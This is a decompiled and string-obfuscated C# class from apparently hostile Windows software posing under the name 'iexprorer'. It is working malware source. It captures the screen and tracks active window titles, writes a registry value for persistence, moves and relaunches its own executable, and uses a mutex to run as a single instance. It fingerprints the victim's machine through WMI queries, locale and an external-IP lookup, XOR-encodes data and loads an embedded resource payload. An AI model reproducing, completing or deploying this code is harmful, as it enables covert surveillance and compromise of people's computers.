using System;
using System.Collections;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace iexprorer;

internal sealed class Icon
{
	public delegate void MethodCollection(string string_0, out Mutex mutex_0);

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
	private sealed class MemoryScope
	{
		public uint valuesMap;

		public uint valuesSet;

		public ulong valuesMap;

		public ulong valuesSet;

		public ulong activeGenerator;

		public ulong propStorePosition;

		public ulong lastLine;

		public ulong activeName;

		public ulong captionLength;

		public MemoryScope()
		{
			this.valuesMap = (uint)Marshal.SizeOf((object)this);
		}
	}

	private static string valuesMap;

	public static string LoadDeployment => valuesMap;

	public static string ProcessPciture
	{
		set
		{
			valuesMap = value;
		}
	}

	public static void ProcessPciture()
	{
		new Thread(ResolveView).Start();
	}

	private static void ResolveView()
	{
		uint uint_ = RegisterWindowMessage(_003CModule_003E.smethod_0("൘\u0d63\u0d64\u0d46\u0d65൭൭൯൸\u0d43\u0d64൹ൾ൫\u0d64൩൯", 3338));
		while (true)
		{
			PostMessage(65535, uint_, (IntPtr)Process.GetCurrentProcess().Id, IntPtr.Zero);
			Thread.Sleep(1000);
		}
	}

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool PostMessage(int int_0, uint uint_0, IntPtr intptr_0, IntPtr intptr_1);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern uint RegisterWindowMessage(string string_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr LoadLibraryA(string string_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

	public static T ProcessPciture<T>(string string_0)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(string_0.Split(new char[1] { ':' })[0]), string_0.Split(new char[1] { ':' })[1]), typeof(T));
	}

	public static bool ProcessPciture(string string_0)
	{
		if (Assembly.GetExecutingAssembly().Location.ToLower() == string_0.ToLower())
		{
			return true;
		}
		return false;
	}

	public static string ResolveView()
	{
		return Assembly.GetExecutingAssembly().Location;
	}

	public static bool ProcessPciture(ref string string_0)
	{
		string text = new string('\0', 100);
		GetWindowText(GetForegroundWindow(), text, 100);
		text = text.Substring(0, text.IndexOf('\0'));
		if (valuesMap != text)
		{
			string_0 = text;
			valuesMap = string_0;
			return true;
		}
		return false;
	}

	[DllImport("user32.dll", SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetWindowText(int int_0, string string_0, int int_1);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern uint GetModuleFileName([In] IntPtr intptr_0, [Out] StringBuilder stringBuilder_0, [In][MarshalAs(UnmanagedType.U4)] int int_0);

	[DllImport("kernel32.dll")]
	private static extern void ExitProcess(uint uint_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern bool MoveFileEx(string string_0, string string_1, long long_0);

	public static void LoadDeployment(string string_0, string string_1)
	{
		if (File.Exists(string_0))
		{
			File.Delete(string_0);
		}
		string location = Assembly.GetExecutingAssembly().Location;
		StringBuilder stringBuilder = new StringBuilder(location);
		MoveFileEx(location.Substring(0, (int)GetModuleFileName(IntPtr.Zero, stringBuilder, stringBuilder.Capacity)), string_0, 8L);
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			Arguments = string_1,
			FileName = string_0
		};
		process.Start();
		ExitProcess(0u);
	}

	public static string Print()
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(_003CModule_003E.smethod_0("ᬏᬓᬓᬗ᭝ᭈᭈᬆᬒᬓᬈᬊᬆᬓᬎᬈᬉᭉᬐᬏᬆᬓᬎᬔᬊᬞᬎᬗᭉ\u1b04ᬈᬊᭈᬉ᭗᭞᭕᭔᭗᭞᭓᭒ᭉᬆᬔᬗ", 7015));
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			Stream responseStream = httpWebResponse.GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream);
			return streamReader.ReadToEnd();
		}
		catch (Exception)
		{
			return _003CModule_003E.smethod_0("ȏȴȱȴȵȭȴ", 602);
		}
	}

	public static void Print(string string_0, string string_1)
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ᔀᔜᔕᔇᔄᔒᔁᔖᔏᔞᔺᔰᔡᔼᔠᔼᔵᔧᔏᔄᔺᔽᔷᔼᔤᔠᔏᔐᔦᔡᔡᔶᔽᔧᔅᔶᔡᔠᔺᔼᔽᔏᔁᔦᔽ", 5459));
		registryKey.OpenSubKey(_003CModule_003E.smethod_0("\u05c5יא\u05c2\u05c1ח\u05c4ד\u05caכ\u05ff\u05f5פ\u05f9ץ\u05f9װע\u05ca\u05c1\u05ff\u05f8ײ\u05f9סץ\u05caוףפפ׳\u05f8ע׀׳פץ\u05ff\u05f9\u05f8\u05ca\u05c4ף\u05f8", 1430), writable: true);
		registryKey.SetValue(string_0, string_1);
	}

	public static string ProcessDrive(int int_0, int int_1)
	{
		int num = new Random((int)DateTime.Now.Ticks).Next(int_0, int_1);
		string text = _003CModule_003E.smethod_0("\u0f98\u0f9eྌ\u0f9b\u0f9d\u0f90\u0f9c\u0f80\u0f86\u0f99ྈ\u0f9a\u0f8d\u0f8f\u0f8e\u0f81\u0f83\u0f82྅\u0f93\u0f91ྊ\u0f9fྋ\u0f87\u0f84\u0fb8྾\u0fac\u0fbb\u0fbd\u0fb0\u0fbc\u0fa0\u0fa6\u0fb9\u0fa8\u0fba\u0fad\u0faf\u0fae\u0fa1\u0fa3\u0fa2\u0fa5\u0fb3\u0fb1\u0faa྿\u0fab\u0fa7\u0fa4࿘\u0fdb࿚\u0fdd\u0fdc\u0fdf\u0fde࿑࿐࿙", 4073);
		Random random = new Random((int)(DateTime.Now.Ticks * -1));
		ProcessPciture(text.ToCharArray());
		char[] array = new char[num];
		for (int i = 0; i < num; i++)
		{
			array[i] = text[(int)((double)text.Length * random.NextDouble())];
		}
		return new string(array);
	}

	private static T[] ProcessPciture<T>(T[] gparam_0)
	{
		SortedList sortedList = new SortedList();
		Random random = new Random();
		for (int i = 0; i <= gparam_0.GetUpperBound(0); i++)
		{
			int num = random.Next();
			while (sortedList.ContainsKey(num))
			{
				num = random.Next();
			}
			sortedList.Add(num, gparam_0[i]);
		}
		T[] array = new T[gparam_0.Length];
		sortedList.Values.CopyTo(array, 0);
		return array;
	}

	public static string UncheckNetwork()
	{
		return DateTime.Now.ToString(_003CModule_003E.smethod_0("ࢽࢽ\u08cf\u0898\u0898\u08cf\u0886\u0886\u08d5\u0891\u0891\u08daࢸࢸ\u08da\u088c\u088c\u088c\u088c", 2293));
	}

	public static void ResolveView(string string_0)
	{
		try
		{
			Thread.Sleep(5000);
			Mutex.OpenExisting(string_0);
			Application.Exit();
		}
		catch (Exception)
		{
			new Mutex(initiallyOwned: false, string_0);
		}
	}

	public static Image ProcessPciture()
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		Rectangle rectangle = default(Rectangle);
		Bitmap val = null;
		Graphics val2 = null;
		rectangle = Screen.get_PrimaryScreen().get_Bounds();
		val = new Bitmap(rectangle.Width, rectangle.Height, (PixelFormat)2498570);
		val2 = Graphics.FromImage((Image)(object)val);
		val2.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, (CopyPixelOperation)13369376);
		return (Image)(object)val;
	}

	public static string DeployMenuItem()
	{
		try
		{
			string englishName = CultureInfo.CurrentCulture.EnglishName;
			return englishName.Substring(englishName.IndexOf('(') + 1, englishName.LastIndexOf(')') - englishName.IndexOf('(') - 1);
		}
		catch (Exception)
		{
			return _003CModule_003E.smethod_0("੨\u0a53\u0a56\u0a53\u0a52\u0a4a\u0a53", 2621);
		}
	}

	public static string ListTemplate()
	{
		try
		{
			string englishName = CultureInfo.CurrentCulture.EnglishName;
			return englishName.Remove(englishName.IndexOf(_003CModule_003E.smethod_0("ᇡᇩ", 4545)));
		}
		catch (Exception)
		{
			return _003CModule_003E.smethod_0("ᔻᔀᔅᔀᔁᔙᔀ", 5486);
		}
	}

	public static byte[] ProcessPciture(byte[] byte_0, byte[] byte_1)
	{
		byte[] array = new byte[byte_0.Length + 1];
		byte b = (byte)new Random((int)DateTime.Now.Ticks).Next(1, 255);
		int num = array.Length - 2;
		for (int i = 0; i <= num; i++)
		{
			array[i] = (byte)(byte_0[i] ^ ((int)(byte)(byte_1[i % (int)(byte)byte_1.Length] << ((i + b + byte_1.Length) & 7)) % 256));
		}
		array[^1] = b;
		return Encoding.Default.GetBytes(Convert.ToBase64String(array));
	}

	public static byte[] ResolveView(byte[] byte_0, byte[] byte_1)
	{
		byte[] array = Convert.FromBase64String(Encoding.Default.GetString(byte_0));
		byte[] array2 = new byte[array.Length - 2 + 1];
		byte b = array[^1];
		int num = array2.Length - 1;
		for (int i = 0; i <= num; i++)
		{
			array2[i] = (byte)(array[i] ^ ((int)(byte)(byte_1[i % byte_1.Length] << ((i + b + byte_1.Length) & 7)) % 256));
		}
		return array2;
	}

	public static string DeployStream()
	{
		if (8 != IntPtr.Size && string.IsNullOrEmpty(Environment.GetEnvironmentVariable(_003CModule_003E.smethod_0("\u02e7\u02e5\u02f8\u02f4\u02f2ˤˤ\u02f8\u02e5\u02e8\u02f6\u02e5\u02f4\u02ff\u02feˣ\u02f2ˠʁʃʄʅ", 695))))
		{
			return Environment.GetEnvironmentVariable(_003CModule_003E.smethod_0("⅝ⅿⅢⅪⅿⅬⅠ⅋ⅤⅡⅨⅾ", 8461));
		}
		return Environment.GetEnvironmentVariable(_003CModule_003E.smethod_0("ᆓᆱᆬᆤᆱᆢᆮᆅᆪᆯᆦᆰᇫᆻᇻᇵᇪ", 4547));
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool GlobalMemoryStatusEx([In][Out] MemoryScope memoryScope_0);

	public static string UnregisterPartition()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		try
		{
			string result = string.Empty;
			ManagementObjectSearcher val = new ManagementObjectSearcher(_003CModule_003E.smethod_0("ᦞᦈᦁᦈᦎᦙ᧭ᦎ\u19acᦽᦹᦤᦢᦣ᧭ᦋᦟᦂᦀ᧭ᦚᦤᦣ᧾᧿ᦒᦂᦽᦨᦿ\u19acᦹᦤᦣᦪᦞᦴᦾᦹᦨᦠ", 6605));
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val2).get_Item(_003CModule_003E.smethod_0("\u1ac2\u1ae0\u1af1\u1af5\u1ae8\u1aee\u1aef", 6785)).ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch (Exception)
		{
			return _003CModule_003E.smethod_0("ṝṦṣṦṧṿṦ", 7688);
		}
	}

	public static ulong ProcessPciture()
	{
		try
		{
			MemoryScope memoryScope = new MemoryScope();
			if (GlobalMemoryStatusEx(memoryScope))
			{
				return memoryScope.valuesMap;
			}
			return 0uL;
		}
		catch (Exception)
		{
			return 0uL;
		}
	}

	public static string ResolveAssembly()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		try
		{
			string result = string.Empty;
			ManagementObjectSearcher val = new ManagementObjectSearcher(_003CModule_003E.smethod_0("ញសពសយណ\u17faផញលឨ\u17b9ឲឳឮ\u17bf\u17b9ឮឯឨ\u17bf\u17faវឈផភ\u17faឍឳ\u17b4៩៨ចផឪ\u17bfឨ\u17bbឮឳ\u17b4\u17bdញឣឩឮ\u17bf\u17b7", 6106));
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val2).get_Item(_003CModule_003E.smethod_0("।ॸ४ख़\u0948\u0943\u0942य़\u094e\u0948य़फ़ख़\u094e", 2347)).ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch (Exception)
		{
			return _003CModule_003E.smethod_0("პქრქფჼქ", 4235);
		}
	}

	public static string BuildDrive()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		try
		{
			string result = string.Empty;
			ManagementObjectSearcher val = new ManagementObjectSearcher(_003CModule_003E.smethod_0("\u0eed\u0efb\u0ef2\u0efb\u0efd\u0eeaພ\u0eed\u0edb\u0ecc໗ໟ໒\u0ef0\u0ecb໓ໜ\u0edb\u0eccພ\u0ef8\u0eec\u0ef1\u0ef3ພ\u0ee9໗໐ຍຌ\u0ee1\u0ef1\u0ece\u0edb\u0eccໟ\u0eca໗໐໙\u0eed\u0ec7\u0ecd\u0eca\u0edb໓", 3774));
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val2).get_Item(_003CModule_003E.smethod_0("ОШпФЬСЃиРЯШп", 1101)).ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch (Exception)
		{
			return _003CModule_003E.smethod_0("ᾕᾮᾫᾮᾯᾷᾮ", 8128);
		}
	}

	public static byte[] ProcessPciture(string string_0)
	{
		IntPtr moduleHandleA = GetModuleHandleA(string_0);
		IntPtr intptr_ = FindResource(moduleHandleA, _003CModule_003E.smethod_0("Ӻ", 1226), _003CModule_003E.smethod_0("ݥݣݨݥݴݳݶݣݶ", 1847));
		IntPtr source = LoadResource(moduleHandleA, intptr_);
		int num = SizeofResource(moduleHandleA, intptr_);
		byte[] array = new byte[num];
		Marshal.Copy(source, array, 0, num);
		return array;
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr FindResource(IntPtr intptr_0, string string_0, string string_1);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetModuleHandleA(string string_0);

	[DllImport("kernel32.dll")]
	private static extern int SizeofResource(IntPtr intptr_0, IntPtr intptr_1);

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadResource(IntPtr intptr_0, IntPtr intptr_1);
}
